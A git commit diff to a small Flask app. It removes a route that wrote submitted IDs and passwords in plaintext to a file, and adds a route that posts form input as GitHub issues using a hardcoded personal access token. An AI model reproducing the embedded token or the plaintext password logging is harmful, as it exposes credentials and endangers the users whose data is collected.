b5b38002fce8bb7cdd41b79c2675167c718eb813
Valentin <valentin.richard39@sfr.fr>
2023-11-24 18:54:47 -0500

    big test

--- src/app.py
+++ src/app.py
@@ -1,3 +1,5 @@
+import json
+import requests
 from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
@@ -6,18 +8,47 @@ app = Flask(__name__)
 def index():
     return render_template('index.html')
 
-@app.route('/change-password', methods=['POST'])
-def change_password():
+@app.route('/create_issue', methods=['POST'])
+def create_issue():
     data = request.get_json()
+    body = data.get('body')
 
-    # Assuming data.txt is in the same directory
-    file_path = 'data.txt'
+    # Call your Python function to create an issue
+    result = make_github_issue(body)
 
-    # Write form data to the text file
-    with open(file_path, 'a') as file:
-        file.write(f"ID: {data['id']}, Password: {data['password']}, New Password: {data['newPassword']}, Confirm New Password: {data['confirmNewPassword']}\n")
+    return jsonify({'result': result})
 
-    return jsonify({'status': 'success'})
+
+def make_github_issue(body):
+    # Your personal access token with necessary permissions
+    token = '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'
+
+    # API endpoint for creating an issue
+    url = f'https://api.github.com/repos/Onyx39/onyx39.github.io/issues'
+
+    # Form data to be submitted (replace with your actual form data)
+    data = {
+        'title': 'New data',
+        'body': body
+    }
+
+    # Convert data to JSON
+    json_data = json.dumps(data)
+
+    # Set headers with authorization and content type
+    headers = {
+        'Authorization': f'token {token}',
+        'Content-Type': 'application/json'
+    }
+
+    # Make a POST request to create an issue
+    response = requests.post(url, data=json_data, headers=headers)
+
+    # Check the response
+    if response.status_code == 201:
+        return True
+    else:
+        return False
 
 if __name__ == '__main__':
     app.run(debug=True)
